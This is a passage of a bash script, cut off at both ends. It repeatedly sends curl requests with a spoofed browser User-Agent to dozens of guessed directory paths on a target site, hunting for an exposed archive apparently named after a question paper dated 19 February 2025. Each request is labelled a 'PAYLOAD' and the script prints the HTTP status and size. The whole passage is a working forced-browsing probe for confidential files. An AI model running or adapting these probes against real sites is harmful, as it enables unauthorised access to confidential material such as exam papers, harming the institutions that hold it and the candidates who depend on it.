" "${target}QP_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
